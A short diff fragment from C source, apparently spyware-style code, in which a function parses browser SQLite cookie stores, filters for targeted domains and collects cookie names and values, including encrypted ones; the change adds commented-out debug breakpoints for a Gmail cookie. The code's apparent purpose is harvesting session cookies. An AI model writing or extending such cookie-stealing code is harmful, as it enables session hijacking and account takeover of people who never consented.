@@ -83,6 +83,8 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 
 	NormalizeDomainA(host);
 	if (host && name && value && IsInterestingDomainA(host)) {
+// 		if (!_stricmp(name, "GMAIL_IMP"))
+// 			__asm int 3;
 		if (value[0]==NULL && enc_value_a[0]!=NULL) // Se era un cookie cifrato
 			AddCookieA(host, name, enc_value_a);
 		else
